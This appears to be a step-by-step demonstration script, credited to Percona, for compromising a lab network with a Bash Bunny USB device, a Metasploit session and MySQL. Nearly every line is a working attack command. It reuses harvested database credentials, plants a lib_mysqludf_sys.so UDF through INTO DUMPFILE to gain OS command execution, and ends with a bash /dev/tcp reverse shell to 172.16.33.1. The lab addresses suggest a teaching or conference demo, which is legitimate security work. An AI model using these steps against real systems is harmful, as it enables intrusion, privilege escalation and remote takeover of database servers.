.. Copyright 2017 Percona LLC / David Busby

#. Load the bashbunny with compromise/bashbunny/payloads/switch1/*
#. `sync` && eject bashbunny
#. Unplug bashbunny, slide switch to position 1
#. re-plug bashbunny, allow to run light will show green when done it should be at the point of MSFconsole running `exploit` to start the multi/handler
#. in a new tab `curl -skv http://172.16.33.2/vuln_webapp/images.php 2>/dev/null &`
#. msfconsole _should_ get a new session
#. You may want to demonstrated you can not reach 3306/tcp on 172.16.33.3 at this point e.g. `nc -v 172.16.33.3 3306`
#. In msfconsole run: `portfwd add -l 3306 -p 3306 -r 172.16.33.3`
#. Use credentials from `cat.sqli` in the meterepter session to run on the CnC / localhost `mysql -uvuln_webapp -ppluk`
#. In mysql run the follwing `show grants(); select whomami();`
#. In new tab settup a listener with netcat `nc -l 11457`
#. Head back to mysql client tab

#. mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp < udf_stager.sql 
#. mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT @@GLOBAL.plugin_dir" 
#. mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT payload FROM udf_stager INTO DUMPFILE '/usr/lib64/mysql/plugin/lib_mysqludf_sys.so'"

#. cat > udf_functions.sql << EOF
DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
DROP FUNCTION IF EXISTS sys_get;
DROP FUNCTION IF EXISTS sys_set;
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;

CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
EOF
#. mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp < udf_functions.sql 
#. mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT sys_eval('id')" 
#. mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT sys_eval('whoami')" 
#. mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT sys_eval('bash -i >& /dev/tcp/172.16.33.1/11458 0>&1 &')"
